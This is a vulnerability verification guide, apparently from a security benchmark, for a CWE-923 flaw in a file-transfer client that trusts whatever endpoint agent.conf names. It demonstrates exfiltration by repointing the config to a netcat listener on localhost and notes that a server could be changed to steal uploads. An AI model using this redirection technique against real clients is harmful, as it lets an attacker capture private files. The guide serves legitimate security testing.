
# Verification Guide

## CWE-923: Improper Restriction of Communication Channel to Intended Endpoints

### Vulnerability Location

- **File:** `src/client.py`
- **Function:** `read_server_address`
- **Approximate Line Number:** 6-16

The client reads the server address for file upload operations from a plain text configuration file (`agent.conf`) without any validation or secure binding to an intended endpoint (i.e., no cryptographic authentication, no fixed endpoint, configurable by the user or attacker with no protections).

### Verification Steps

#### 1. Set up the legitimate server

In a terminal, start the provided server:

```bash
cd projects/FileTransferAgent/src
python3 server.py
```

#### 2. Confirm normal client operation

In another terminal, with the default config (which points to localhost):

```bash
cd projects/FileTransferAgent/src
echo "test file content" > test.txt
python3 client.py upload test.txt
python3 client.py list
```

Files should be uploaded to the local server.

#### 3. Simulate an attacker starting a malicious server

In a third terminal, start a *malicious* server (can simply copy `server.py` to another port):

```bash
cd projects/FileTransferAgent/src
# Modify this server to e.g., log or exfiltrate files before saving, or just copy as-is for demonstration
# Start on a different port
python3 server.py # Let this be on port 5002 after modification, or use the mode below.
```

Or, for a simple demonstration, use `nc` (netcat) to exfiltrate uploads:

```bash
nc -l 0.0.0.0 7000
```

#### 4. Change the client config to point to the attacker's "server"

Edit the `agent.conf` file in `src/` to:

```
http://127.0.0.1:7000
```

#### 5. Upload using the client

```bash
python3 client.py upload test.txt
```

If using `nc`, you will see file data appear in the `nc` terminal, showing the client blindly sent it anywhere configured. If using the second server process, you could inspect its uploads or modify its logic to simulate a real attack.

#### 6. Analysis

This demonstrates that the client process – which may be used in privileged scripts or for sensitive files – will upload to any endpoint specified, with no validation, trust anchor, or endpoint authentication. This is a classic CWE-923: Improper Restriction of Communication Channel to Intended Endpoints.

**In summary:** An attacker who is able to modify the `agent.conf` file or influence the environment can redirect sensitive file uploads to an arbitrary, attacker-controlled endpoint.

